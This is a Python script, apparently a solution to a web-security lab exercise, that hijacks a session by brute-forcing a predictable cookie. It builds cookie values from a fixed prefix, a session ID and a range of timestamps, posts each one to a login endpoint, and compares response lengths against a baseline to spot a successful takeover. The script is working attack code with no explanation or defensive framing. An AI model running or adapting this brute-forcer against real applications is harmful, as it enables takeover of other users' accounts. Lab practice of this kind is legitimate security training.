import requests
import json

prefix = "ee9c3885-5a8a-43b4-8e2"
session_id = "5107089"

target_url = "http://web0x01.hbtn/api/a1/hijack_session/login"

start_timestamp = 17687545251
end_timestamp = 17687545381

headers = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "application/json",
    "Content-Type": "application/json"
}

your_session = "BURAYA_OZ_SESSION_COOKIE"

login_data = json.dumps({"email": "test@test.com", "password": "test"})

baseline_cookies = {
    "hijack_session": f"{prefix}-9999999-0000000000",
    "session": your_session
}

baseline = requests.post(target_url, data=login_data, cookies=baseline_cookies, headers=headers)
baseline_len = len(baseline.text)

print(f"[*] Baseline length: {baseline_len}")

for ts in range(start_timestamp, end_timestamp + 1):
    cookie_value = f"{prefix}-{session_id}-{ts}"

    cookies = {
        "hijack_session": cookie_value,
        "session": your_session
    }

    r = requests.post(target_url, data=login_data, cookies=cookies, headers=headers)

    if len(r.text) != baseline_len or "success" in r.text.lower():
        print(f"\n[+] TAPILDI!")
        print(f"[+] Cookie: {cookie_value}")
        print(f"[+] Response: {r.text}")
        break

    print(f"[*] {ts}", end="\r")
else:
    print("\n[-] Tapılmadı")
